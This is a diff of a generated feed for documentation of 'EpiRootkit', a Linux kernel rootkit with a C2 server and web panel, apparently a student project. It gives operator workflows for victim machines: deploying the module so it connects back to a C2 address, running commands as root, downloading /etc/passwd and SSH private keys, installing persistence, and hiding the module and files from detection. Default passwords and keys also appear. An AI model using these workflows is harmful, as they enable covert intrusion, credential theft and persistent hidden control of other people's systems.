- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>config &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
- &lt;td>Interactive configuration&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;/tbody>
-&lt;/table>
-&lt;h2 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="list-clients">List Clients &lt;a href="#list-clients" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>attacking_program/config.env&lt;/code> if needed:&lt;/p>
+
 
 
  
@@ -636,13 +506,14 @@ npm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="e43335c" class="language-bash ">
- &lt;code>ls # List all connected clients
-# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
-# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM&lt;/code>
+ &lt;pre id="980f0ff" class="language-env ">
+ &lt;code>C2_PORT=4444
+WEB_PORT=3000
+C2_WEBUI_PASSWORD_HASH=348735696e74c45e7fbf9c6839d87f891486d19e5059db7e397d5086e486dc0051a533752805dc9288463673f0a6fcbf2a655548738a85305b2d571bae44a71e
+ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;p>&lt;strong>Generate your own hash&lt;/strong>: &lt;code>echo -n &amp;quot;yourpassword&amp;quot; | sha512sum&lt;/code>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h2 id="essential-commands">Essential Commands &lt;a href="#essential-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -657,16 +528,36 @@ npm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="96cd259" class="language-bash ">
- &lt;code>auth Client-1 password # Authenticate with client
-# ✓ [2025-05-25 16:13:29] Authenticated
-# SUCCESS: Authentication successful
+ &lt;pre id="320b712" class="language-bash ">
+ &lt;code># Client Management
+clients # List connected clients
+auth 1 password # Authenticate with client 1
+exec 1 whoami # Execute command on client 1
+status 1 # Get rootkit status
 
-auth Client-1 wrongpass # Wrong password
-# ERROR: Authentication failed&lt;/code>
+# File Operations 
+upload 1 file.txt # Upload file to client
+download 1 /etc/passwd # Download file from client
+ls 1 /home # List directory on client
+
+# Configuration
+config 1 # Interactive configuration menu
+persist install 1 # Install persistence
+persist remove 1 # Remove persistence
+
+# Stealth Controls
+hide 1 # Hide rootkit module
+unhide 1 # Show rootkit module
+enable-file-hiding 1 # Enable file hiding
+disable-file-hiding 1 # Disable file hiding
+
+# Utility
+help # Show help
+clear # Clear screen
+exit # Exit server&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Security Features:&lt;/strong>&lt;/p></description></item><item><title>Usage &amp; Workflows</title><link>/docs/03-attacking-program/usage/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-start-c2-server">1. Start C2 Server &lt;a href="#1-start-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;p>&lt;strong>Note&lt;/strong>: Use client index (1, 2, 3&amp;hellip;) or client name. Authentication required for most commands.&lt;/p></description></item><item><title>Usage</title><link>/docs/03-attacking-program/usage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/usage/</guid><description>&lt;h2 id="start-server">Start Server &lt;a href="#start-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -681,14 +572,11 @@ auth Client-1 wrongpass # Wrong password
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="afe9f21" class="language-bash ">
- &lt;code>cd attacking_program
-pnpm start
-# ✓ Server started on port 4444
-# ✓ Web interface started on port 3000&lt;/code>
+ &lt;pre id="3d1aa61" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Start C2 server &amp;#43; Web UI&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="2-install-rootkit-victim">2. Install Rootkit (Victim) &lt;a href="#2-install-rootkit-victim" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="basic-workflow">Basic Workflow &lt;a href="#basic-workflow" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -703,12 +591,31 @@ pnpm start
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="fc11726" class="language-bash ">
- &lt;code>sudo insmod epirootkit.ko
-# C2 server shows: ✓ Client-1 Connected&lt;/code>
+ &lt;pre id="0252e2c" class="language-bash ">
+ &lt;code># 1. List clients
+clients
+# Index | Client Name | Status | Last Seen
+# 1 | Client-1 | UNAUTHENTICATED| 6:13:29 PM
+
+# 2. Authenticate 
+auth 1 password
+# ✓ Authentication successful
+
+# 3. Execute commands
+exec 1 whoami
+exec 1 uname -a
+exec 1 ps aux
+
+# 4. Transfer files
+upload 1 script.sh # Upload to client
+download 1 /etc/passwd # Download from client
+
+# 5. Configure
+config 1 # Interactive menu
+persist install 1 # Install persistence&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="3-authenticate">3. Authenticate &lt;a href="#3-authenticate" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="file-operations">File Operations &lt;a href="#file-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -723,13 +630,14 @@ pnpm start
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="bb5de1e" class="language-bash ">
- &lt;code>auth Client-1 password
-# ✓ [2025-05-25 16:13:30] Authenticated
-# SUCCESS: Authentication successful&lt;/code>
+ &lt;pre id="735078a" class="language-bash ">
+ &lt;code>ls 1 /home # List directory
+upload 1 ./file.txt # Upload (to current dir)
+upload 1 ./file.txt /tmp/ # Upload to specific path
+download 1 /etc/hosts # Downloads to downloads/ folder&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="basic-workflows">Basic Workflows &lt;a href="#basic-workflows" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="stealth">Stealth &lt;a href="#stealth" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -744,191 +652,13 @@ pnpm start
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="02bab3a" class="language-bash ">
- &lt;code># List clients
-ls
-# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
-# • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM
-
-# Check status
-status Client-1
-# EpiRootkit Status:
-# Version: 1.0.0
-# Authentication: YES
-# Module Hidden: YES
-# Persistence: ENABLED
-
-# Monitor connection
-keepalive Client-1
-# Last ping: 2025-05-25 16:14:00
-# Connection: STABLE&lt;/code>
+ &lt;pre id="8edbfff" class="language-bash ">
+ &lt;code>status 1 # Check current stealth status
+hide 1 # Hide rootkit module
+enable-file-hiding 1 # Enable file hiding&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="command-execution">Command Execution &lt;a href="#command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="0eaf943" class="language-bash ">
- &lt;code># System reconnaissance
-exec Client-1 whoami
-# Exit code: 0
-# Output: root
-
-exec Client-1 uname -a
-# Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux
-
-exec Client-1 ps aux | head -5
-# USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
-# root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init
-
-# Network information
-exec Client-1 ip addr show
-exec Client-1 netstat -tuln&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="65b64db" class="language-bash ">
- &lt;code># Upload files
-upload Client-1 ./script.sh /tmp/script.sh
-# ✓ File uploaded successfully (512 bytes)
-
-exec Client-1 chmod &amp;#43;x /tmp/script.sh
-exec Client-1 /tmp/script.sh
-
-# Download files
-download Client-1 /etc/passwd ./passwd
-# ✓ File downloaded successfully (2048 bytes)
-
-download Client-1 /home/user/.ssh/id_rsa ./keys/
-# ✓ File downloaded successfully (1679 bytes)&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="advanced-workflows">Advanced Workflows &lt;a href="#advanced-workflows" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="persistence-setup">Persistence Setup &lt;a href="#persistence-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="1fa03c5" class="language-bash ">
- &lt;code># Install all persistence mechanisms
-persist Client-1 install
-# SUCCESS: All persistence mechanisms installed
-
-# Test persistence (victim reboots)
-exec Client-1 reboot
-# Wait for reconnection...
-
-ls
-# • Client-1 - UNAUTHENTICATED - Last seen: Just now
-
-auth Client-1 password
-status Client-1
-# Persistence: ENABLED (survived reboot)&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="stealth-operations">Stealth Operations &lt;a href="#stealth-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="0a60352" class="language-bash ">
- &lt;code># Check current stealth status
-status Client-1
-# Module Hidden: YES
-# File Hiding: YES
-
-# Test module hiding
-exec Client-1 lsmod | grep epirootkit
-# (no output - module hidden)
-
-# Test file hiding
-exec Client-1 touch /tmp/epirootkit_test
-exec Client-1 ls /tmp/ | grep epirootkit
-# (no output - file hidden)
-
-# But file still accessible
-exec Client-1 cat /tmp/epirootkit_test
-# (works normally)&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="configuration-management">Configuration Management &lt;a href="#configuration-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="7902f39" class="language-bash ">
- &lt;code># Interactive configuration
-config Client-1
-# ┌─ Configuration - Client-1
-# [X] Module Hiding (Click to disable)
-# [X] File Hiding (Click to disable)
-# [X] Persistence (Click to disable)
-
-# Direct commands
-hide_module Client-1
-# SUCCESS: Module hidden
-
-unhide_module Client-1
-# SUCCESS: Module visible
-
-hide_files Client-1
-# SUCCESS: File hiding enabled&lt;/code>
- &lt;/pre>
- &lt;/div></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
+&lt;p>&lt;strong>Access Web UI&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;/p></description></item><item><title>Overview</title><link>/docs/04-web-ui/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-web-ui/overview/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/dashboard.png"
  alt="C2 Dashboard Main">
 &lt;/figure>
 
@@ -947,45 +677,27 @@ hide_files Client-1
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="8734805" class="language-bash ">
- &lt;code># Start system (includes Web UI)
-./deploy_c2.sh
-
-# Access Web UI
-# URL: http://localhost:3000
-# Password: password&lt;/code>
+ &lt;pre id="fda96a2" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Start C2 &amp;#43; Web UI&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Frontend Technology Stack:&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>Access&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;br>
+&lt;strong>Default Password&lt;/strong>: &lt;code>secret123&lt;/code> (hash configured in &lt;code>config.env&lt;/code>)&lt;/p>
+&lt;h2 id="features">Features &lt;a href="#features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/authentication/">Authentication&lt;/a>&lt;/strong>: Secure login for web interface&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/dashboard/">Dashboard&lt;/a>&lt;/strong>: Real-time client monitoring with stats&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/client-management/">Client Management&lt;/a>&lt;/strong>: Individual client control&lt;/li>
+&lt;/ul>
+&lt;h3 id="client-panels">Client Panels &lt;a href="#client-panels" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>When managing individual clients (&lt;code>/clients/:id&lt;/code>), the following panels are available:&lt;/p>
 &lt;ul>
-&lt;li>&lt;strong>Framework&lt;/strong>: React 18 + Vite&lt;/li>
-&lt;li>&lt;strong>Styling&lt;/strong>: Tailwind CSS + shadcn/ui components&lt;/li>
-&lt;li>&lt;strong>State&lt;/strong>: React Context + hooks&lt;/li>
-&lt;li>&lt;strong>Real-time&lt;/strong>: WebSocket connections via Socket.IO&lt;/li>
-&lt;li>&lt;strong>Authentication&lt;/strong>: JWT tokens with session management&lt;/li>
-&lt;/ul>
-&lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>Dashboard&lt;/strong>: Real-time client monitoring and statistics&lt;/li>
-&lt;li>&lt;strong>Authentication&lt;/strong>: Secure login with JWT tokens&lt;/li>
-&lt;li>&lt;strong>Client Management&lt;/strong>: Visual client cards with status indicators&lt;/li>
-&lt;li>&lt;strong>Interactive Panels&lt;/strong>: Terminal, file transfer, configuration, logs&lt;/li>
-&lt;li>&lt;strong>Real-time Updates&lt;/strong>: Live WebSocket synchronization&lt;/li>
-&lt;/ul>
-&lt;h2 id="user-interface">User Interface &lt;a href="#user-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="main-components">Main Components &lt;a href="#main-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Login Screen&lt;/strong>: JWT authentication&lt;/li>
-&lt;li>&lt;strong>Dashboard&lt;/strong>: Client overview with search and filtering&lt;/li>
-&lt;li>&lt;strong>Client Cards&lt;/strong>: Visual representation of connected rootkits&lt;/li>
-&lt;li>&lt;strong>Panel System&lt;/strong>: Tabbed interface for different operations&lt;/li>
-&lt;/ul>
-&lt;h3 id="panel-types">Panel Types &lt;a href="#panel-types" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Terminal Panel&lt;/strong>: Command execution interface&lt;/li>
-&lt;li>&lt;strong>Upload/Download Panel&lt;/strong>: File transfer with drag-drop&lt;/li>
-&lt;li>&lt;strong>Configuration Panel&lt;/strong>: Toggle rootkit settings&lt;/li>
-&lt;li>&lt;strong>Authentication Panel&lt;/strong>: Client authentication management&lt;/li>
-&lt;li>&lt;strong>Event Log Panel&lt;/strong>: Real-time activity monitoring&lt;/li>
-&lt;/ul>
-&lt;h2 id="integration">Integration &lt;a href="#integration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The Web UI integrates with the &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/overview/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Installation &amp; Setup</title><link>/docs/04-web-ui/installation/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;p>The Web UI is integrated with the C2 server and launches automatically.&lt;/p>
-&lt;h2 id="quick-setup">Quick Setup &lt;a href="#quick-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/overview-panel/">Overview Panel&lt;/a>&lt;/strong>: Client status and information&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/authentication-panel/">Authentication Panel&lt;/a>&lt;/strong>: Client authentication management&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/terminal-panel/">Terminal Panel&lt;/a>&lt;/strong>: Execute commands on clients&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/upload-download-panel/">Upload/Download Panel&lt;/a>&lt;/strong>: File transfer with drag-drop&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/persistence-panel/">Persistence Panel&lt;/a>&lt;/strong>: Manage rootkit persistence&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/configuration-panel/">Configuration Panel&lt;/a>&lt;/strong>: Toggle rootkit settings&lt;/li>
+&lt;li>&lt;strong>&lt;a href="/docs/04-web-ui/features/panels/event-log-panel/">Event Log Panel&lt;/a>&lt;/strong>: Real-time activity monitoring&lt;/li>
+&lt;/ul></description></item><item><title>Installation</title><link>/docs/04-web-ui/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-web-ui/installation/</guid><description>&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -1000,18 +712,39 @@ hide_files Client-1
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="ebfea24" class="language-bash ">
- &lt;code># From project root
-./deploy_c2.sh&lt;/code>
+ &lt;pre id="9ac9fe8" class="language-bash ">
+ &lt;code>./deploy_c2.sh # Builds and starts everything&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>This starts both the C2 server and Web UI simultaneously.&lt;/p>
-&lt;h2 id="access">Access &lt;a href="#access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>URL&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Default Password&lt;/strong>: &lt;code>password&lt;/code>&lt;/li>
-&lt;li>&lt;strong>Features&lt;/strong>: All C2 functionality via web interface&lt;/li>
-&lt;/ul>
-&lt;h2 id="manual-installation">Manual Installation &lt;a href="#manual-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If you need to install dependencies manually:&lt;/p>
+&lt;p>&lt;strong>Access&lt;/strong>: &lt;code>http://localhost:3000&lt;/code>&lt;/p>
+&lt;h2 id="manual-build">Manual Build &lt;a href="#manual-build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="40d9a46" class="language-bash ">
+ &lt;code># Build frontend
+cd webui &amp;amp;&amp;amp; npm install &amp;amp;&amp;amp; npm run build &amp;amp;&amp;amp; cd ..
+
+# Deploy to backend
+mkdir -p attacking_program/public
+cp -r webui/dist/* attacking_program/public/
+
+# Start server
+cd attacking_program &amp;amp;&amp;amp; npm install &amp;amp;&amp;amp; npm start&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Password hash configured in &lt;code>attacking_program/config.env&lt;/code>:&lt;/p>
 
 
 
@@ -1027,13 +760,11 @@ hide_files Client-1
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="388e366" class="language-bash ">
- &lt;code>cd attacking_program
-pnpm install
-pnpm start&lt;/code>
+ &lt;pre id="65d6b1a" class="language-env ">
+ &lt;code>C2_WEBUI_PASSWORD_HASH=348735696e74c45e7fbf9c6839d87f891486d19e5059db7e397d5086e486dc0051a533752805dc9288463673f0a6fcbf2a655548738a85305b2d571bae44a71e&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>For detailed configuration options, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/installation/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/login.png"
+&lt;p>Default password is &lt;code>secret123&lt;/code>. Generate custom hash: &lt;code>echo -n &amp;quot;yourpassword&amp;quot; | sha512sum&lt;/code>&lt;/p></description></item><item><title>Authentication</title><link>/docs/04-web-ui/features/authentication/</link><pubDate>Sun, 25 May 2025 16:00:00 +0100</pubDate><guid>/docs/04-web-ui/features/authentication/</guid><description>&lt;figure class="img-fluid">&lt;img src="/images/webui/login.png"
  alt="Login Screen">
 &lt;/figure>
 
@@ -1310,7 +1041,7 @@ sudo cat /sys/kernel/epirootkit/control # Check status&lt;/code>
 sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="build">Build &lt;a href="#build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="using-deploy-script-recommended">Using Deploy Script (Recommended) &lt;a href="#using-deploy-script-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -1325,7 +1056,27 @@ sudo apt install -y build-essential linux-headers-$(uname -r)&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="eef045c" class="language-bash ">
+ &lt;pre id="a874dd3" class="language-bash ">
+ &lt;code># Build rootkit using main deployment script
+./deploy_c2.sh --rootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="manual-build">Manual Build &lt;a href="#manual-build" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="f9e9859" class="language-bash ">
  &lt;code>cd rootkit
 make clean &amp;amp;&amp;amp; make
 # ✓ Build successful: epirootkit.ko created&lt;/code>
@@ -1346,23 +1097,47 @@ make clean &amp;amp;&amp;amp; make
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b8525b1" class="language-bash ">
- &lt;code># Default usage (uses ./epirootkit.ko automatically)
+ &lt;pre id="49c12a5" class="language-bash ">
+ &lt;code># Basic deployment (uses ./epirootkit.ko automatically)
+cd rootkit
 sudo ./deploy_rootkit.sh
 
 # Custom C2 server
-sudo ./deploy_rootkit.sh ./epirootkit.ko address=192.168.200.11 port=4444
+sudo ./deploy_rootkit.sh -a 192.168.200.11 -p 4444
 
-# Domain-based deployment
-sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com
+# Domain-based deployment 
+sudo ./deploy_rootkit.sh -a c2.example.com
 
-# Stealth deployment with self-cleanup
-sudo ./deploy_rootkit.sh --self-delete
-
-# Verbose deployment (show output)
-sudo ./deploy_rootkit.sh --verbose&lt;/code>
+# Custom module file
+sudo ./deploy_rootkit.sh -m /path/to/epirootkit.ko&lt;/code>
  &lt;/pre>
  &lt;/div>
+&lt;h3 id="deployment-commands">Deployment Commands &lt;a href="#deployment-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Command&lt;/th>
+ &lt;th>Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;code>deploy&lt;/code>&lt;/td>
+ &lt;td>Install and load module (default)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>status&lt;/code>&lt;/td>
+ &lt;td>Check current module status&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>uninstall&lt;/code>&lt;/td>
+ &lt;td>Remove module completely&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;code>help&lt;/code>&lt;/td>
+ &lt;td>Show detailed help&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
 &lt;h3 id="deployment-options">Deployment Options &lt;a href="#deployment-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;table>
  &lt;thead>
  &lt;tr>
@@ -1372,20 +1147,20 @@ sudo ./deploy_rootkit.sh --verbose&lt;/code>
  &lt;/thead>
  &lt;tbody>
  &lt;tr>
- &lt;td>&lt;code>--verbose&lt;/code>&lt;/td>
- &lt;td>Show detailed output during deployment&lt;/td>
+ &lt;td>&lt;code>-m, --module FILE&lt;/code>&lt;/td>
+ &lt;td>Specify module file (default: ./epirootkit.ko)&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>--self-delete&lt;/code>&lt;/td>
- &lt;td>Remove script after successful deployment&lt;/td>
+ &lt;td>&lt;code>-a, --address ADDR&lt;/code>&lt;/td>
+ &lt;td>C2 server address (default: 192.168.200.11)&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>status&lt;/code>&lt;/td>
- &lt;td>Check current deployment status&lt;/td>
+ &lt;td>&lt;code>-p, --port PORT&lt;/code>&lt;/td>
+ &lt;td>C2 server port (default: 4444)&lt;/td>
  &lt;/tr>
  &lt;tr>
- &lt;td>&lt;code>uninstall&lt;/code>&lt;/td>
- &lt;td>Remove module and cleanup&lt;/td>
+ &lt;td>&lt;code>-h, --help&lt;/code>&lt;/td>
+ &lt;td>Show help message&lt;/td>
  &lt;/tr>
  &lt;/tbody>
 &lt;/table>
@@ -1404,17 +1179,14 @@ sudo ./deploy_rootkit.sh --verbose&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="feb98c6" class="language-bash ">
- &lt;code># Stealth deployment
-sudo ./deploy_rootkit.sh address=c2.example.com port=443 --self-delete
-
-# Deploy with verbose output then self-destruct
-sudo ./deploy_rootkit.sh --verbose --self-delete
+ &lt;pre id="15498ab" class="language-bash ">
+ &lt;code># Custom deployment with domain
+sudo ./deploy_rootkit.sh -a c2.example.com -p 443
 
 # Check deployment status
 sudo ./deploy_rootkit.sh status
-# Status: Active (hidden)
-# Note: Persistence is managed internally by the rootkit
+# Module is loaded and visible
+# OR: Module is loaded and hidden (stealth mode active)
 
 # Remove deployment
